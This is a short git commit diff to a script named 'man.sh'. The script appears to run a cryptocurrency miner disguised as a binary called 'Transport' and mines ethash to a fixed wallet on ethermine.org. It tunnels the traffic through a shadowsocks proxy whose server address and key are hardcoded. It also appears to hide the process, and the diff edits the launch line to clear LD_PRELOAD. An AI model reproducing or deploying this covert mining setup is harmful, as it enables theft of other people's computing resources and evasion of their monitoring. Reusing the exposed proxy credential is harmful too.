a7bccaa8fdb419d7f32fad69eeb2c5b759885af7
renilo <88342640+renilo@users.noreply.github.com>
2022-04-06 19:55:17 +0700

    Update man.sh

--- man.sh
+++ man.sh
@@ -39,4 +39,4 @@ ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305
 
 ph add Transport
 
-./Transport -a ethash -o stratum+tcp://us1.ethermine.org:4444 -u 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p x -w Transport --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+LD_PRELOAD="" ./Transport -a ethash -o stratum+tcp://us1.ethermine.org:4444 -u 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p x -w Transport --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
